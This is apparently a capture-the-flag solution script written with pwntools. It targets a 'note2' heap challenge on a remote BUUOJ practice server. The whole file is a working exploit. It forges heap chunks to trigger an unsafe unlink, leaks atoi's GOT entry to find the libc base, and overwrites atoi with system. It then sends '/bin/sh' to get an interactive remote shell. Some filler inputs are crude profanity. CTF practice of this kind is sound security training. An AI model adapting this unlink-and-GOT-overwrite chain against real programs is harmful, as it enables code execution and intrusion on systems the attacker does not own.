from pwn import *
r = remote('node3.buuoj.cn',28075)
#r = process('./note2')
elf = ELF('./note2')
libc = ELF('/libc-2.23.so')
#context.log_level = 'debug'
def add(size,content):
    r.recvuntil('option--->>')
    r.sendline('1')
    r.recvuntil('(less than 128)')
    r.sendline(str(size))
    r.recvuntil('content:')
    r.sendline(content)


def show(index):
    r.recvuntil('option--->>')
    r.sendline('2')
    r.recvuntil('note:')
    r.sendline(str(index))


def edit(index,content):
    r.recvuntil('option--->>')
    r.sendline('3')
    r.recvuntil('note:')
    r.sendline(str(index))
    r.recvuntil('2.append')
    r.sendline('1')
    r.sendline(content)


def free(index):
    r.recvuntil('option--->>')
    r.sendline('4')
    r.recvuntil('note:')
    r.sendline(str(index))

ptr = 0x602120
r.sendline('wdnmd')
r.sendline('nmsl')

fake_chunk = p64(0)#prev_size
fake_chunk += p64(0xa1)#size
fake_chunk += p64(ptr-0x18)#fd
fake_chunk += p64(ptr-0x10)#bk
add(0x80,fake_chunk)
add(0,'fuck')
add(0x80,'fuck')
free(1)
fake_chunk = p64(0)*2
fake_chunk += p64(0xa0)#prev_size
fake_chunk += p64(0x90)#size
add(0,fake_chunk)
free(2)#unlink

edit(0,'a'*0x18+p64(elf.got['atoi']))
show(0)

r.recvuntil('is ')
libc_base = u64(r.recv(6).ljust(8, '\x00')) - libc.symbols['atoi']
log.success(hex(libc_base))
system = libc_base+libc.sym['system']
edit(0,p64(system))
r.sendline('/bin/sh\x00')
r.interactive()